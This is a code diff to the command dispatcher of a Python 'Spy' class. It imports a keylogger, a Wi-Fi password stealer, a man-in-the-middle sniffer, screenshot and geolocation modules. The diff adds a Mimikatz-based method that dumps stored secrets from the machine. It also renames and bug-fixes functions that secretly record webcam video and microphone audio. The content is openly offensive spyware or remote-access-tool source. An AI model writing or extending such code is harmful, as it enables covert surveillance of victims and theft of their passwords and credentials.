@@ -1,6 +1,8 @@
 import os
 import threading
 from typing import Optional, Tuple
+
+from spying.consts import DEFAULT_VIDEO_AUDIO_NAME
 from spying.KeyLogger import KeyLogger
 from spying.Wifi import steal_passwords
 import spying.admin
@@ -9,6 +11,7 @@ from pyautogui import screenshot
 import geocoder
 from spying.encrypt import Encryptor
 from spying.MITM import netstart, filestart, stop_sniffing, is_MITM_runs
+from spying.pc_passwords import get_secrets
 # from browser_history import get_history, get_bookmarks
 
 
@@ -25,16 +28,20 @@ class Spy:
             "start_keylogger": self.start_keylogger,
             "stop_keylogger": self.stop_keylogger,
             "start_video_audio_record": self.start_video_audio_record,
-            "start_video_recording": self.start_video_recording,
-            "start_audio_recording": self.start_audio_recording,
+            "start_video_record": self.start_video_record,
+            "start_audio_record": self.start_audio_record,
             "stop_video_audio_record": self.stop_video_audio_record,
-            "stop_video_recording": self.stop_video_recording,
-            "stop_audio_recording": self.stop_audio_recording
+            "stop_video_record": self.stop_video_record,
+            "stop_audio_record": self.stop_audio_record
         }
 
     @staticmethod
     def steal_passwords() -> str:
         return steal_passwords()
+
+    @staticmethod
+    def passwords_by_mimikatz() -> str:
+        return get_secrets()
 
     def start_keylogger(self) -> bool:
         if self.keyLogger:
@@ -57,7 +64,7 @@ class Spy:
         return self.keyLogger is not None
 
     def start_video_audio_record(self, camindex=None) -> bool:
-        if self.audio_recorder or self.audio_recorder:
+        if self.audio_recorder or self.video_recorder:
             return False
         self.video_recorder = VideoRecorder(camindex=camindex)
         self.audio_recorder = AudioRecorder()
@@ -65,35 +72,50 @@ class Spy:
         self.audio_recorder.start()
         return True
 
-    def start_video_recording(self, filename=None, camindex=None) -> bool:
+    def start_video_record(self, filename=None, camindex=None) -> bool:
         if self.video_recorder:
             return False
         self.video_recorder = VideoRecorder(filename, camindex=camindex) if filename else VideoRecorder(camindex=camindex)
         self.video_recorder.start()
         return True
 
-    def start_audio_recording(self, filename=None) -> bool:
+    def start_audio_record(self, filename=None) -> bool:
         if self.audio_recorder:
             return False
         self.audio_recorder = AudioRecorder(filename) if filename else AudioRecorder()
         self.audio_recorder.start()
         return True
 
-    def stop_video_audio_record(self, filename="video") -> bool:
+    def stop_video_audio_record(self, filename=DEFAULT_VIDEO_AUDIO_NAME) -> bool:
         if (not self.audio_recorder) or (not self.audio_recorder):
             return False
         self.video_recorder.stop_merge(self.audio_recorder, filename)
+        self.audio_recorder = None
+        self.video_recorder = None
         return True
 
-    def stop_video_recording(self) -> bool:
+    def stop_video_record(self) -> bool:
         if not self.video_recorder:
             return False
-        return self.video_recorder.stop()
+        r = self.video_recorder.stop()
+        self.video_recorder = None
+        return r
 
-    def stop_audio_recording(self) -> bool:
-        if self.audio_recorder:
+    def stop_audio_record(self) -> bool:
+        if not self.audio_recorder:
             return False
-        return self.audio_recorder.stop()
+        r = self.audio_recorder.stop()
+        self.audio_recorder = None
+        return r
+
+    def is_video_audio_started(self):
+        return self.is_audio_started() and self.is_video_started()
+
+    def is_video_started(self):
+        return self.video_recorder is not None
+
+    def is_audio_started(self):
+        return self.audio_recorder is not None
 
     @staticmethod
     def get_available_cameras() -> str:
